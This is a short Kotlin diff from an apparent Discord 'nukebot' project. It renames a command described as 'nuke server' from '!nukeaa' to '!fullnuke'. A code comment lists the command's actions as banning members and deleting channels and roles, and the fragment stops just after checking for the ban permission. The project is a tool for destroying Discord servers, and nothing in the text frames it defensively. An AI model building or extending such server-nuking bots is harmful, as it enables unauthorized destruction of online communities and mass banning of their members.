@@ -7,15 +7,15 @@ import thenano.nukebot.bot.command.CommandListener
 import thenano.nukebot.bot.command.CommandManager
 import kotlin.jvm.Throws
 
-@CommandListener.Info("!nukeaa <tag(true/false) <channelName> <contents>","nuke server",false)
-class nukeaa : CommandListener() {
+@CommandListener.Info("!fullnuke <tag(true/false) <channelName> <contents>","nuke server",false)
+class FullNuke : CommandListener() {
 
     @Throws(RuntimeException::class)
-    override fun onMessageReceived(event: MessageReceivedEvent) {
+    override fun onEvent(event: MessageReceivedEvent) {
 
 //BAN,del channel,del role,
 
-        if (message.contentRaw.startsWith("!nukeaa")) {
+        if (message.contentRaw.startsWith("!fullnuke")) {
             if (onInit(event)) return
 
             if (guild.selfMember.hasPermission(Permission.BAN_MEMBERS))
